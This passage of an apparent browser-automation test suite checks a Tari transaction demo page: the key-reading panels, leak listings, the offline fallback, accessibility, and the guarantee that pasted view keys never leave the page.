  await shotEl(page, 'article.auditor', `seance-${w}-${mode}-template.png`)
  // keyboard: from the title, Tab reaches the code, then the two links, each with the yellow outline
  await page.evaluate(() => {
    window.__seen = new WeakSet()
  })
  await page.focus('details.maker summary')
  const stops = []
  for (let i = 0; i < 3; i++) {
    await page.keyboard.press('Tab')
    stops.push(await page.evaluate(focusProbe))
  }
  const bad = stops.filter((s) => s.style !== 'solid' || s.width < 2 || !s.onScreen || s.color !== 'rgb(255, 224, 138)')
  const names = stops.map((s) => s.name ?? '')
  check(names[0] === 'pre' && names[1].startsWith('a "The file on GitHub') && names[2].startsWith('a#token-link "The token on the explor') && bad.length === 0, `${tag}: Tab goes from the title to the code and the two links, each with the yellow 3 px outline and on screen`, stops.map((s) => `${s.name} ${s.style} ${s.width} ${s.onScreen}`).join('; '))
}

// ---------- the judge path ----------
const liveBodies = new Map() // id -> stranger text from a live run, compared with the recorded run

async function walk(browser, { mode, w }) {
  const live = mode === 'live'
  const tag = `${mode} ${w}px`
  const { page, log } = await open(browser, { w })
  const wide = w >= 960
  const H = 800 // the viewport height open() uses
  // wide: the Stranger card starts in the upper half of the screen; one column: the page scrolled it to the top
  const inView = (x) => (wide ? x.strangerTop >= 0 && x.strangerTop <= H / 2 : Math.abs(x.strangerTop) <= 24)
  let s = await snap(page)
  check(externalHosts(log).length === 0 && log.requests.every((r) => new URL(r.url).pathname.startsWith('/seance-v2/')), `${tag}: loading the page asks nobody but its own server (all paths under /seance-v2/)`, `${log.requests.length} requests`)
  // The first screen is never empty: demo 1 from the recording, read by the three ghosts with the keys already in hand. Nothing was asked of the indexer.
  const ex = hero(1)
  check(s.badge === 'Live' && s.pressed === 'false' && s.shownId === ex.id && s.hash === '' && s.txid === '', `${tag}: first view: the page is live and already shows a saved example (demo ${demoNo(ex)}), and leaves the address bar and the id field alone`, `${s.badge} ${s.pressed} ${String(s.shownId).slice(0, 12)} "${s.hash}" "${s.txid}"`)
  check(s.source === EXAMPLE_SOURCE && /^A saved example is on the table/.test(s.status) && /Nothing has been asked of the indexer yet/.test(s.status) && /info/.test(s.statusClass), `${tag}: first view: the Stranger and the status line both say it is a saved example and that the indexer has not been asked`, `${s.source} | ${s.status.slice(0, 60)}`)
  checkLinks(s, ex.id, `${tag}: first view`)
  check(s.fileButton === 'Open a saved transaction file' && s.fileButtonAria !== 'true' && !s.ask && s.netFile === null, `${tag}: first view: the file button is ready, and neither the prompt nor the file line shows`, `${s.fileButton} aria-disabled=${s.fileButtonAria} ask=${s.ask}`)
  await netlogChecks(page, log, `${tag}: first view`)
  check(s.checkedKey === ex.to && s.auditChecked === 'auditor' && s.empty === null && s.auditEmpty === null && s.leaksEmpty === null && s.strangerEmpty === null, `${tag}: first view: ${ex.to}'s key and the audit key are already in hand, and no card is waiting`, `${s.checkedKey} ${s.auditChecked} ${s.empty} | ${s.auditEmpty} | ${s.leaksEmpty}`)
  expectHeard(s, ex, ex.to, `${tag}: first view: ${ex.to}'s key opens ${ex.to}'s note of the example`)
  auditReads(s, ex, `${tag}: first view: the audit key counts the example`)
  leaksChecks(s, ex, `${tag}: first view`)
  check(
    await page.evaluate(() => {
      const n = (q) => document.querySelectorAll(q).length
      return [...document.querySelectorAll('#demo optgroup')].map((g) => g.children.length).join() === '4,11' && n('input[name=key]') === 4 && n('input[name=audit-key]') === 4 && !/coming next/i.test(document.querySelector('.lens.auditor').innerText)
    }),
    `${tag}: 15 demos (4 with an audit key, 11 without), 4 keys to hand the Medium and 4 for the Auditor, the Auditor card is no longer "Coming next"`,
  )
  poltergeistChecks(s, tag)
  if (live) liveBodies.set(`${w}:polt`, s.poltText)
  else if (liveBodies.has(`${w}:polt`)) check(liveBodies.get(`${w}:polt`) === s.poltText, `${tag}: the Poltergeist's text is word for word the same as in the live run (it reads recorded data only)`)
  await layout(page, `${tag} landing`, { wide })
  if (live) await shot(page, `seance-${w}-live-landing.png`)
  await shotEl(page, '#poltergeist', `seance-${w}-${mode}-poltergeist.png`)
  await page.evaluate(() => scrollTo(0, 0))
  await axe(page, `${tag} landing`)

  if (!live) {
    await page.click('#mode-switch')
    s = await snap(page)
    check(s.badge === 'Recorded' && s.pressed === 'true' && s.status === 'Switched to recorded data. Nothing will be asked of the indexer.', `${tag}: the manual switch turns recorded mode on and says so`)
    await shot(page, `seance-${w}-recorded-landing.png`)
    await axe(page, `${tag} landing after the switch`)
  }

  // 10 seconds: summon a recent transaction
  const t0 = Date.now()
  await page.click('#summon')
  await settled(page)
  const ms = Date.now() - t0
  await scrollSettled(page)
  s = await snap(page)
  const quiet = live && /^Recorded:/.test(s.source ?? '')
  check(isHex64(s.shownId) && s.txid === s.shownId && s.hash === `#tx=${s.shownId}`, `${tag}: "Summon" shows a transaction id (${s.shownId?.slice(0, 10)}...), in the id field and the address`)
  check(live ? /^Live:/.test(s.source ?? '') || quiet : /^Recorded:/.test(s.source ?? ''), `${tag}: the Stranger says where the data came from`, `${s.source}${quiet ? ' (quiet chain)' : ''}`)
  check(ms < 10000, `${tag}: the 10 s step took ${ms} ms`)
  checkLinks(s, s.shownId, `${tag}: after "Summon"`)
  if (live && !quiet) {
    const c = indexerCalls(log)
    check(PICKED.test(s.source ?? '') && c.list === 1 && c.byId.length === 0 && c.all === 1, `${tag}: "Summon" made one request, for the list of latest transactions, and none for an id: the page picked in the browser`, `${s.source} | ${c.list} list, ${c.byId.length} by id`)
  }
  if (live && !quiet) check(!OURS.has(s.shownId) || /one of the demos we made/.test(s.status), `${tag}: Summon shows a stranger's transaction, or says it is one of ours`, `${OURS.has(s.shownId) ? 'ours' : 'stranger'}`)
  if (!live) check(!OURS.has(s.shownId) && !/one of the demos we made/.test(s.status), `${tag}: Summon from the recorded sample never serves one of ours`)
  check(s.notes >= 1 && s.notesOpen === (wide ? s.notes : 0), `${tag}: sealed notes are ${wide ? 'open' : 'closed'} by default (${s.notes})`)
  // The keys from the first screen are still in hand (Bob's, and the audit key): a stranger's transaction is not Bob's, so the Medium hears nothing, and the Auditor has no proof to count.
  // A summoned transaction of ours (the live chain held nobody else's) may be read, so only a stranger's is held to this.
  if (!OURS.has(s.shownId)) {
    check(s.checkedKey === ex.to && s.empty === null && s.quiet === QUIET && s.readings.length === 0, `${tag}: ${ex.to}'s key, still in hand from the first screen, hears nothing in a stranger's transaction ("${QUIET}")`, `${s.checkedKey} | ${s.quiet} | ${s.empty}`)
    check(s.auditEmpty?.startsWith(AUDIT_NO_PROOF) || s.auditQuiet === QUIET, `${tag}: the Auditor has nothing to count in it: no audit proof on this transaction, or a proof that is not for this key`, s.auditEmpty ?? s.auditQuiet ?? '')
  }
  check(s.leaks.map((l) => l.id).join() === LEAK_IDS.join() && s.leaksEmpty === null, `${tag}: the leaks panel lists what this transaction leaves public`, s.leaks.map((l) => l.id).join())
  check(inView(s), `${tag}: the answer is on screen without scrolling by hand: the Stranger card ${wide ? 'starts in the upper half' : 'was scrolled to the top'}`, `top ${s.strangerTop}px of ${H}px, scrollY ${s.scrollY}`)

  // 10 seconds, other way: paste an id
  if (live && !quiet && !OURS.has(s.shownId)) {
    // the id Summon picked is in the list the page holds: pasting it reads it from there, and the indexer is not asked for it
    const picked = s.shownId
    const before = indexerCalls(log)
    const cached = Date.now() - t0 < 50000 // the page keeps the list for 60 s
    await page.$eval('#txid', (el) => el.select())
    await page.keyboard.sendCharacter(picked)
    await page.click('#look')
    await settled(page)
    s = await snap(page)
    const c = indexerCalls(log)
    check(s.shownId === picked && LISTED.test(s.source ?? '') && c.byId.length === 0 && (cached ? c.list === before.list : c.list - before.list <= 1), `${tag}: pasting that id finds it in the list the page already holds: ${cached ? 'no request at all' : 'at most the list again'}, none for the id`, `${s.source} | ${c.list} list, ${c.byId.length} by id`)
    check(/^Found in the indexer's latest \d+ transactions?, so the indexer was not asked for this id\./.test(s.status), `${tag}: the status line says the same`, s.status.slice(0, 90))
    checkLinks(s, picked, `${tag}: an id found in the list`)
  }
  await page.$eval('#txid', (el) => el.select())
  await page.keyboard.sendCharacter(tx(3).id)
  await page.click('#look')
  await settled(page)
  s = await snap(page)
  if (live) check(indexerCalls(log).byId.includes(tx(3).id), `${tag}: a pasted demo id is asked for by id, as in v1 (our own public transaction)`)
  check(s.shownId === tx(3).id && (live ? /^(Live:|Recorded: the public indexer no longer holds this transaction)/ : /^Recorded:/).test(s.source ?? ''), `${tag}: a pasted id shows that transaction (live: read from the indexer, or the saved copy if the indexer dropped it)`, s.source ?? '')
  checkLinks(s, tx(3).id, `${tag}: a pasted id`)

  // 60 seconds: hold the seance on a demo
  await page.select('#demo', tx(1).id)
  await armReading(page)
  await page.click('#hold')
  await settled(page)
  await scrollSettled(page)
  s = await snap(page)
  check(s.shownId === tx(1).id && s.checkedKey === 'bob', `${tag}: "Hold the seance" shows demo ${demoNo(tx(1))} and picks Bob's key`)
  checkLinks(s, tx(1).id, `${tag}: demo ${demoNo(tx(1))}`)
  expectHeard(s, tx(1), 'bob', `${tag}: Bob's key on demo ${demoNo(tx(1))}`)
  leaksChecks(s, tx(1), `${tag} demo ${demoNo(tx(1))}`)
  check(s.auditEmpty?.startsWith(AUDIT_NO_PROOF) && s.auditReadings.length === 0, `${tag}: a demo without an audit key leaves the Auditor nothing to count, and it says why`, s.auditEmpty ?? '')
  check(!s.strangerText.includes(tx(1).memo) && !s.strangerText.includes(tari(tx(1).amount)), `${tag}: the Stranger's card shows neither the memo nor the amount`)
  check(/Read inside this page with Bob's key\. The key was not sent anywhere\./.test(s.readingText), `${tag}: the Medium says it listened locally`)
  check(inView(s), `${tag}: after "Hold the seance" the answer is on screen without scrolling by hand`, `top ${s.strangerTop}px of ${H}px`)
  if (live) liveBodies.set(`${w}:${tx(1).id}`, s.strangerBody)
  else if (liveBodies.has(`${w}:${tx(1).id}`)) check(liveBodies.get(`${w}:${tx(1).id}`) === s.strangerBody, `${tag}: the Stranger's card for demo ${demoNo(tx(1))} is word for word the same as in the live run`)
  await seeLenses(page)
  await shot(page, `seance-${w}-${mode}-bob.png`)
  if (wide) await shot(page, `seance-${w}-${mode}-bob-full.png`, { fullPage: true })

  // the wrong key, the other key
  for (const name of ['eve', 'carol', 'bob']) {
    await armReading(page)
    await page.click(`input[name=key][value="${name}"]`)
    s = await heard(page)
    expectHeard(s, tx(1), name, `${tag}: ${name}'s key on demo ${demoNo(tx(1))}`)
    if (name === 'eve') {
      // side by side: the three cards from their heading; one column: the end of the Medium card, where its answer is
      if (wide) await seeLenses(page)
      else await page.evaluate(() => document.querySelector('.lens.medium').scrollIntoView({ block: 'end' }))
      await shot(page, `seance-${w}-${mode}-silence.png`)
    }
  }

  // own key: never leaves the page
  const own = '#own-key'
  const typeKey = async (value) => {
    await armReading(page)
    await page.$eval(own, (el) => el.select())
    if (value === '') await page.keyboard.press('Backspace')
    else await page.keyboard.sendCharacter(value)
    return heard(page)
  }
  s = await typeKey(keys.bob.viewSecret)
  expectHeard(s, tx(1), 'bob', `${tag}: pasting Bob's secret into the own-key field`)
  check(s.checkedKey === null && /with your key/.test(s.readingText), `${tag}: a pasted key unchecks the demo keys and is called "your key"`)
  const stranger = randomBytes(32).toString('hex')
  s = await typeKey(stranger)
  expectHeard(s, tx(1), 'nobody', `${tag}: a random pasted key`)
  s = await typeKey('not a key')
  check(/A view secret is 64 hexadecimal characters/.test(s.ownHint) && s.empty === NO_KEY && s.readings.length === 0, `${tag}: a malformed key gets a hint and no reading`, s.ownHint)
  s = await typeKey('')
  check(s.ownHint === '' && s.empty === NO_KEY, `${tag}: clearing the field clears the hint`)
  await typeKey(keys.bob.viewSecret)
  const probe = await page.evaluate((secret) => ({ href: location.href, storage: JSON.stringify(localStorage) + JSON.stringify(sessionStorage), cookie: document.cookie, state: JSON.stringify(history.state), body: document.body.innerText.includes(secret) }), keys.bob.viewSecret)
  const sent = log.requests.filter((r) => [r.url, r.post, r.headers].some((x) => x.includes(keys.bob.viewSecret) || x.includes(keys.bob.viewSecret.slice(0, 16)) || x.includes(stranger.slice(0, 16)))).length
  check(sent === 0, `${tag}: no request carried the pasted keys (${log.requests.length} requests checked: URL, headers, body)`)
  s = await snap(page)
  check(!s.netLeak && /; your keys were in none of them\.$/.test(s.netHead), `${tag}: the ghost log, which watches the demo keys and the pasted ones, still says your keys were in none of the requests`, s.netHead)
  check(!probe.href.includes(keys.bob.viewSecret) && !probe.storage.includes(keys.bob.viewSecret) && !probe.cookie.includes(keys.bob.viewSecret) && !probe.state.includes(keys.bob.viewSecret) && !probe.body, `${tag}: the pasted key is not in the address, storage, cookies, history or page text`)

  // a revealed amount: nothing sealed to read
  await page.select('#demo', tx(11).id)
  await armReading(page)
  await page.click('#hold')
  await settled(page)
  s = await heard(page)
  check(s.shownId === tx(11).id && /revealed the amount on purpose/.test(s.status), `${tag}: the revealed-amount demo says so`)
  expectHeard(s, tx(11), 'bob', `${tag}: Bob's key on demo ${demoNo(tx(11))} (amount revealed)`)
  leaksChecks(s, tx(11), `${tag} demo ${demoNo(tx(11))}`)

  // more demos
  const more = live ? (w === 1280 ? [7] : []) : [2, 3, 4, 5, 6, 7, 8, 9, 10]
  for (const n of more) {
    await page.select('#demo', tx(n).id)
    await armReading(page)
    await page.click('#hold')
    await settled(page)
    s = await heard(page)
    check(s.shownId === tx(n).id && s.checkedKey === tx(n).to, `${tag}: demo ${demoNo(tx(n))} shows its id and picks ${tx(n).to}'s key`)
    expectHeard(s, tx(n), tx(n).to, `${tag}: demo ${demoNo(tx(n))} read by ${tx(n).to}`)
  }
  await auditorWalk(page, tag, { live, w, wide, which: live ? (w === 1280 ? [1, 4] : [1]) : [1, 2, 3, 4] })
  if (!live) {
    const was = s.badge
    check(was === 'Recorded', `${tag}: the page stayed in recorded mode throughout`)
    await page.$eval('#txid', (el) => el.select())
    await page.keyboard.sendCharacter(UNKNOWN)
    await page.click('#look')
    await settled(page)
    s = await snap(page)
    check(/^Recorded mode only knows the demo transactions/.test(s.status) && /error/.test(s.statusClass) && s.badge === 'Recorded', `${tag}: an unknown id says "recorded mode only knows the demos" and stays recorded`)
  }
  const before = log.requests.length
  await page.$eval('#txid', (el) => el.select())
  await page.keyboard.sendCharacter('abc')
  await page.click('#look')
  await settled(page)
  await scrollSettled(page) // the page scrolls the message into view smoothly; look once that has ended
  s = await snap(page)
  check(/^A transaction id is 64 hexadecimal characters/.test(s.status) && /error/.test(s.statusClass) && log.requests.length === before, `${tag}: a malformed id is refused without a request`)
  check(s.statusInView, `${tag}: the page brings the error message into view`)
  check(s.leaksEmpty === NO_LEAKS && s.auditEmpty === AUDIT_NO_TX && s.leaks.length === 0, `${tag}: after an error the leaks panel and the Auditor wait again, and show nothing from the earlier transaction`, `${s.leaksEmpty} | ${s.auditEmpty}`)

  // the judge path is done: nothing may have gone wrong in the console
  // live: the browser itself notes each 404 the real indexer answers for a demo it dropped (the page handles it: saved copy); nothing else may appear
  const own404 = (m) => live && m.type === 'error' && m.url.startsWith(INDEXER_URL) && /^Failed to load resource: the server responded with a status of 404/.test(m.text)
  const bad = consoleBad(log).filter((m) => !own404(m))
  const noted = consoleBad(log).length - bad.length
  check(bad.length === 0 && log.pageErrors.length === 0, `${tag}: 0 console errors or warnings, 0 page errors over the whole walk${noted ? ` (the browser's own note for each of ${noted} indexer 404s aside)` : ''}`, bad.map((m) => m.text).concat(log.pageErrors).slice(0, 3).join(' | '))
  const csp = await cspSeen(page, log)
  check(csp.length === 0, `${tag}: 0 Content Security Policy violations over the whole walk`, csp.slice(0, 2).join(' | '))
  const hosts = externalHosts(log)
  if (live) check(hosts.every((h) => h === INDEXER_HOST), `${tag}: the only outside host contacted is the indexer`, hosts.join(', '))
  else check(hosts.length === 0 && log.failed.length === 0, `${tag}: no outside request was even attempted, none failed`, `${hosts.join(', ')} ${log.failed.slice(0, 2).join(' | ')}`)

  // layout, accessibility and keyboard in a full state
  await armReading(page)
  await page.select('#demo', tx(1).id)
  await page.click('#hold')
  await settled(page)
  await heard(page)
  await layout(page, `${tag} loaded`, { wide })
  await axe(page, `${tag} loaded (Bob reads demo ${demoNo(tx(1))}, no audit key)`)
  await armReading(page)
  await armAudit(page)
  await page.select('#demo', hero(1).id)
  await page.click('#hold')
  await settled(page)
  await heard(page)
  await counted(page)
  await layout(page, `${tag} all three ghosts at work`, { wide })
  await axe(page, `${tag} all three ghosts at work (demo ${demoNo(hero(1))})`)
  s = await snap(page)
  check(s.readingText.includes('The other sealed note stays shut for this key.') && !/The other \d/.test(s.readingText), `${tag}: Bob's key opens one of the two notes of demo ${demoNo(hero(1))}, and the caption says "The other sealed note stays shut", not "The other 1"`, s.readingText.slice(-90))
  if (!wide) {
    await page.evaluate(() => document.querySelectorAll('#stranger details').forEach((d) => (d.open = true)))
    await layout(page, `${tag} with every note, audit proof and ciphertext opened`, { wide })
    await axe(page, `${tag} with every note, audit proof and ciphertext opened`)
    await page.evaluate(() => document.querySelector('#stranger details.note').scrollIntoView())
    await shot(page, `seance-${w}-${mode}-note-open.png`)
  }
  await tabThrough(page, `${tag}`)
  await templateChecks(page, tag, { wide, w, mode })
  if (live) {
    // An id the indexer's list does not hold is not asked for by id until the visitor says so. Then it gets a clean "not found" from the real indexer, not a switch to recorded data.
    const quietBefore = consoleBad(log).length
    const before = indexerCalls(log)
    await page.$eval('#txid', (el) => el.select())
    await page.keyboard.sendCharacter(UNKNOWN)
    await page.click('#look')
    await settled(page)
    s = await snap(page)
    let c = indexerCalls(log)
    check(s.ask && NOT_LISTED.test(s.status) && /warn/.test(s.statusClass) && s.askButtons.join('|') === ASK_BUTTONS && s.badge === 'Live' && s.shownId === null, `${tag}: an id outside the indexer's list gets one line and two buttons ("Ask for it anyway", "Open a saved transaction file")`, `${s.badge}: ${s.status.slice(0, 90)} | ${s.askButtons.join('|')}`)
    check(!c.byId.includes(UNKNOWN) && c.byId.length === before.byId.length && c.list - before.list <= 1, `${tag}: and the indexer has not been asked for that id (${c.list - before.list} new list request, 0 for the id)`, `${c.byId.length} by id`)
    await layout(page, `${tag} with the prompt showing`, { wide })
    await axe(page, `${tag} with the prompt showing`)
    await page.click('#ask-anyway')
    await settled(page)
    s = await snap(page)
    c = indexerCalls(log)
    check(s.status === NOT_FOUND && /error/.test(s.statusClass) && s.badge === 'Live' && !s.ask && c.byId.filter((x) => x === UNKNOWN).length === 1, `${tag}: "Ask for it anyway" asks the indexer for exactly that id, once; the real indexer's "not found" comes back with the reason, and the page stays live`, `${s.badge}: ${s.status}`)
    const extra = consoleBad(log).slice(quietBefore)
    check(extra.every((m) => /404/.test(m.text) && m.url.startsWith(INDEXER_URL)), `${tag}: the only console line it caused is the browser's own note about the indexer's 404`, extra.map((m) => m.text).join(' | ') || 'none')
    await page.$eval('#txid', (el) => el.select())
    await page.keyboard.sendCharacter(tx(3).id)
    await page.click('#look')
    await settled(page)
    s = await snap(page)
    check(s.shownId === tx(3).id && s.badge === 'Live' && /^(Live:|Recorded: the public indexer no longer holds this transaction)/.test(s.source ?? ''), `${tag}: after "not found" the next lookup still works, and the page is still live (the indexer's answer, or the saved copy if it dropped this one)`, s.source ?? '')
  }
  await netlogChecks(page, log, `${tag}: at the end of the walk`)
  await page.close()
}

// ---------- the "what still leaks" panel and the Poltergeist ----------
function poltergeistChecks(s, tag) {
  const shown = s.polt.map((t) => [t.id, ...t.results.map((r) => r.num)])
  check(JSON.stringify(shown) === JSON.stringify(POLT), `${tag}: the Poltergeist shows its five tricks, scored as the tests expect`, shown.map((r) => r.join(' / ')).join('; '))
  check(s.polt.every((t) => t.results.length === 2 && t.results[0].label === 'Transparent ledger synthetic' && t.results[1].label === 'Tari recorded, real'), `${tag}: every result says which ledger it is from: "synthetic" for the transparent one, "recorded, real" for Tari`)
  check(/^The transparent ledger is synthetic\./.test(s.synthetic ?? '') && /^On the synthetic transparent ledger/.test(s.verdict ?? '') && /On Tari,/.test(s.verdict ?? ''), `${tag}: the page says the transparent ledger is synthetic, and so does the verdict`, s.verdict ?? '')
}

function leaksChecks(s, t, tag) {
  const item = (id) => s.leaks.find((l) => l.id === id)?.text ?? ''
  const audited = ledger.hero.includes(t)
  const open = (t.expected.revealedOut ?? []).map((o) => `Paid out in the open: ${money(t, o.amount)}`)
  const spent = item('spent').match(/[0-9a-f]{12}…[0-9a-f]{12}/g) ?? []
  check(s.shownId === t.id && s.leaks.map((l) => l.id).join() === LEAK_IDS.join(), `${tag}: the leaks panel lists its ${LEAK_IDS.length} items in order, for the transaction on show`, s.leaks.map((l) => l.id).join())
  const bad = []
  if (!item('token').includes(audited ? ledger.auditor.resource : TARI_RESOURCE)) bad.push('token')
  if (!(audited ? /2 of 2 sealed notes carry an audit proof/ : /None here\./).test(item('audit'))) bad.push('audit')
  if (!(open.length ? open.every((o) => item('revealed').includes(o)) : /None/.test(item('revealed')))) bad.push('revealed')
  if (!item('fee').includes(tari(t.expected.fee))) bad.push('fee')
  check(bad.length === 0, `${tag}: the panel's token, audit proofs, amounts in the open and fee are this transaction's`, bad.join(', '))
  check(spent.length >= 1 && spent.every((c) => s.strangerText.includes(c)), `${tag}: the spent notes in the panel are the ones the Stranger's card shows (${spent.length})`)
}

// ---------- the Auditor, the third ghost ----------
function auditReads(s, t, label) {
  const want = t.expected.outputs.map((o, i, all) => ({ term: `Sealed note ${i + 1} of ${all.length} counted`, amount: money(t, o.auditor), memo: SHUT }))
  check(s.shownId === t.id && JSON.stringify(s.auditReadings) === JSON.stringify(want), `${label} counts ${want.map((x) => x.amount).join(' + ')} and says the memo is shut`, JSON.stringify(s.auditReadings))
  check(!s.auditText.includes(t.memo) && !s.strangerText.includes(t.memo) && !s.strangerText.includes(money(t, t.amount)), `${label}: the memo is in neither the Auditor's card nor the Stranger's, and the Stranger's card shows no amount`)
}

async function auditorWalk(page, tag, { live, w, wide, which }) {
  const mode = live ? 'live' : 'recorded'
  const t = hero(1)
  const d = `${tag} demo ${demoNo(t)}`
  await page.evaluate(() => {
    window.__long = []
  })
  await page.select('#demo', t.id)
  await armReading(page)
  await armAudit(page)
  const t0 = Date.now()
  await page.click('#hold')
  await settled(page)
  await heard(page)
  let s = await counted(page)
  const took = Date.now() - t0
  const run = await traced(page)
  check(s.shownId === t.id && s.checkedKey === 'bob' && s.auditChecked === 'auditor', `${d}: "Hold the seance" hands Bob's key to the Medium and the audit key to the Auditor`)
  checkLinks(s, t.id, d)
  check(/ Paid in the demo token SEANCE, which has an audit key\./.test(s.status) && (live ? /^(Live:|Recorded: the public indexer no longer holds this transaction)/ : /^Recorded:/).test(s.source ?? ''), `${d}: the status line says the token has an audit key; the Stranger says where the data came from (live: the indexer, or the saved copy if it dropped this one)`, `${s.source}`)
  auditReads(s, t, `${d}: the audit key`)
  expectHeard(s, t, 'bob', `${d}: Bob's key`)
  leaksChecks(s, t, d)
  if (live) liveBodies.set(`${w}:${t.id}`, s.strangerBody)
  else if (liveBodies.has(`${w}:${t.id}`)) check(liveBodies.get(`${w}:${t.id}`) === s.strangerBody, `${d}: the Stranger's card, audit proofs included, is word for word the same as in the live run`)
  const ticks = new Set(run.bars.map((b) => b.tick))
  check(run.bars.length >= 10 && ticks.size >= 10 && run.bars.every((b) => b.max === 50000 && b.value > 0 && b.value <= b.max && b.label === 'Counting the amounts' && /^Note [12] of 2: amounts up to [\d,]+ tried$/.test(b.tick)), `${d}: while it counts, the Auditor shows a progress bar and the count so far (${run.bars.length} updates)`, JSON.stringify(run.bars.slice(0, 2)))
  check(run.cards === 1, `${d}: the "Counting…" card is drawn once, so a screen reader hears it once and not once per slice`, `${run.cards}`)
  const longest = Math.max(0, ...run.long)
  check(longest < 100, `${d}: the page never froze for 100 ms while the audit key counted (${took} ms in all; ${run.long.length} tasks of 50 ms or more${longest ? `, the longest ${longest} ms` : ''})`, run.long.join(' '))
  await page.evaluate((onTheSide) => document.getElementById('audit-reading').scrollIntoView({ block: onTheSide ? 'center' : 'end' }), wide)
  await shot(page, `seance-${w}-${mode}-ghosts.png`)
  await shotEl(page, '#leaks', `seance-${w}-${mode}-leaks.png`)

  // a key that is not the audit key hears nothing at all
  for (const name of ['bob', 'eve']) {
    await armAudit(page)
    await page.click(`input[name=audit-key][value="${name}"]`)
    s = await counted(page)
    check(s.auditQuiet === QUIET && s.auditReadings.length === 0 && !/SEANCE|\d/.test(s.auditText), `${d}: ${name}'s key in the Auditor: silence ("${QUIET}"), no amount shown`, s.auditText.slice(0, 80))
  }
  // and the audit key opens no memo: handed to the Medium it hears nothing
  await armReading(page)
  await page.click('input[name=key][value="auditor"]')
  s = await heard(page)
  expectHeard(s, t, 'auditor', `${d}: the audit key handed to the Medium`)
  await armReading(page)
  await page.click('input[name=key][value="bob"]')
  await heard(page)
  // the key is changed while the search is running: the old search must stop and leave nothing behind
  await armAudit(page)
  await page.click('input[name=audit-key][value="auditor"]')
  await until(page, () => document.querySelector('#audit-reading .counting'), undefined, 5000)
  await page.click('input[name=audit-key][value="bob"]')
  await counted(page)
  await sleep(2500) // longer than the whole search takes
  s = await snap(page)
  check(s.auditQuiet === QUIET && s.auditReadings.length === 0, `${d}: a key changed in the middle of the count stops the old search, and nothing from it shows up later`)
  await armAudit(page)
  await page.click('input[name=audit-key][value="auditor"]')
  s = await counted(page)
  auditReads(s, t, `${d}: after the detour, the audit key`)

  for (const n of which.filter((x) => x !== 1)) {
    const u = hero(n)
    const e = `${tag} demo ${demoNo(u)}`
    await page.select('#demo', u.id)
    await armReading(page)
    await armAudit(page)
    await page.click('#hold')
    await settled(page)
    await heard(page)
    s = await counted(page)
    check(s.shownId === u.id && s.checkedKey === u.to && s.auditChecked === 'auditor', `${e}: shows its id, picks ${u.to}'s key for the Medium and the audit key for the Auditor`)
    auditReads(s, u, `${e}: the audit key`)
    expectHeard(s, u, u.to, `${e}: ${u.to}'s key`)
    leaksChecks(s, u, e)
  }
  const all = Math.max(0, ...(await page.evaluate(() => window.__long)))
  check(all < 100, `${tag}: no task of 100 ms or more anywhere in the Auditor walk (${all ? `the longest ${all} ms` : 'none of 50 ms or more'})`)
}

// The same on a phone four times slower: the slices adapt to the speed, so the page still never freezes, only the count takes longer.
async function slowRun(browser) {
  const tag = 'auditor on a slow phone (375px, CPU 4x slower)'
  const t = hero(1)
  const { page } = await open(browser, { w: 375 })
  await page.click('#mode-switch')
  // control: a block of 120 ms that the page runs as a task of its own (a loop inside page.evaluate is not one and goes unreported), so "no long task" below proves something
  await page.evaluate(() => {
    window.__long = [] // whatever the page load took does not count
    setTimeout(() => {
      const t0 = performance.now()
      while (performance.now() - t0 < 120);
    }, 0)
  })
  await sleep(500)
  const control = Math.max(0, ...(await page.evaluate(() => window.__long)))
  check(control >= 100, `${tag}: control: the long-task observer sees a deliberate 120 ms block`, `${control} ms`)
  const cdp = await page.createCDPSession()
  await cdp.send('Emulation.setCPUThrottlingRate', { rate: 4 })
  await page.evaluate(() => {
    window.__long = []
  })
  await page.select('#demo', t.id)
  await armReading(page)
  await armAudit(page)
  await page.click('#hold')
  await settled(page)
  await page.evaluate(() => document.getElementById('audit-reading').scrollIntoView({ block: 'center' }))
  await until(page, () => document.querySelector('#audit-reading progress.tally')?.value > 5000, undefined, 30000)
  await page.screenshot({ path: join(EVID, 'seance-375-recorded-auditor-counting.png'), type: 'png' }) // mid-count
  const s = await counted(page, 120000)
  const first = await traced(page)
  auditReads(s, t, `${tag}: the audit key`)
  // The click also draws the Stranger and the Medium, which on a slow CPU is a task of its own (about 80 ms at 4x here, not the Auditor's), so the
  // Auditor is timed on its own: another key, then the audit key again, with nothing else drawn.
  await page.click('input[name=audit-key][value="eve"]')
  await until(page, () => document.querySelector('#audit-reading .silence'), undefined, 30000)
  await armAudit(page)
  await page.evaluate(() => {
    window.__long = []
  })
  const t1 = Date.now()
  await page.click('input[name=audit-key][value="auditor"]')
  const again = await counted(page, 120000)
  const took = Date.now() - t1
  const run = await traced(page)
  await cdp.send('Emulation.setCPUThrottlingRate', { rate: 1 })
  auditReads(again, t, `${tag}, counted again: the audit key`)
  const longest = Math.max(0, ...run.long)
  check(longest < 100 && run.bars.length >= 10 && run.cards === 1, `${tag}: the Auditor never froze the page for 100 ms (${took} ms in all; ${run.long.length} tasks of 50 ms or more${longest ? `, the longest ${longest} ms` : ''}; ${run.bars.length} progress updates; "Counting" card drawn ${run.cards} time)`, run.long.join(' '))
  check(Math.max(0, ...first.long) < 200, `${tag}: drawing the cards at the click, with the first slice, took no task of 200 ms or more (the longest ${Math.max(0, ...first.long) || 'under 50'} ms)`)
  await page.close()
}

// ---------- the indexer goes away ----------
async function fallbackRun(browser, w) {
  const tag = `auto-fallback ${w}px`
  const { page, log } = await open(browser, { w, url: `${BASE}#tx=${tx(2).id}` })
  await settled(page)
  let s = await snap(page)
  const asked = () => log.requests.filter((r) => new URL(r.url).host === INDEXER_HOST).length
  check(s.badge === 'Recorded' && s.pressed === 'true' && /^The indexer did not answer, so the page switched to recorded data\./.test(s.status) && /warn/.test(s.statusClass), `${tag}: with the indexer unreachable the page switches to recorded by itself and says so`, s.status)
  check(s.shownId === tx(2).id && /^Recorded:/.test(s.source), `${tag}: the id from the address still shows, marked "Recorded"`)
  check(asked() === 1, `${tag}: the indexer was asked once (the first try), then left alone`, `${asked()} requests`)
  const failedRow = await until(page, () => [...document.querySelectorAll('#net-rows tr')].some((tr) => tr.children[2].textContent.includes('indexer') && tr.children[6].textContent === 'failed'), undefined, 5000).then(() => true, () => false)
  check(failedRow, `${tag}: the ghost log shows that one request to the indexer as failed`)
  await armReading(page)
  await page.click('input[name=key][value="carol"]')
  s = await heard(page)
  expectHeard(s, tx(2), 'carol', `${tag}: Carol's key reads demo ${demoNo(tx(2))} from the recording`)
  await page.select('#demo', tx(1).id)
  await page.click('#hold')
  await settled(page)
  s = await snap(page)
